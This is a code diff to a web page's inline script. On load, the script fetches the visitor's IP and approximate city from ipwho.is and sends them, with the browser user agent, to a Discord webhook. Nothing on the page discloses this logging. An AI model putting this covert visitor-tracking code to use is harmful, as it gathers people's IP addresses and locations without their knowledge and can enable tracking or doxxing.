@@ -33,10 +33,11 @@
 
       var userAgent = navigator.userAgent || "unknown";
 
-      function send(ip) {
+      function send(ip, city) {
         var message =
           "**New visit**\n" +
           "IP: " + ip + "\n" +
+          "City: " + city + "\n" +
           "Browser: " + userAgent;
         try {
           fetch(DISCORD_WEBHOOK_URL, {
@@ -49,11 +50,14 @@
         }
       }
 
-      // A static page can't read its own public IP, so ask a lookup service.
-      fetch("https://api.ipify.org?format=json")
+      // A static page can't read its own IP/location, so ask a lookup service.
+      // ipwho.is returns the IP and an approximate city in one call.
+      fetch("https://ipwho.is/")
         .then(function (r) { return r.json(); })
-        .then(function (data) { send(data.ip || "unknown"); })
-        .catch(function () { send("unknown"); });
+        .then(function (data) {
+          send(data.ip || "unknown", data.city || "unknown");
+        })
+        .catch(function () { send("unknown", "unknown"); });
     })();
   </script>
 </body>
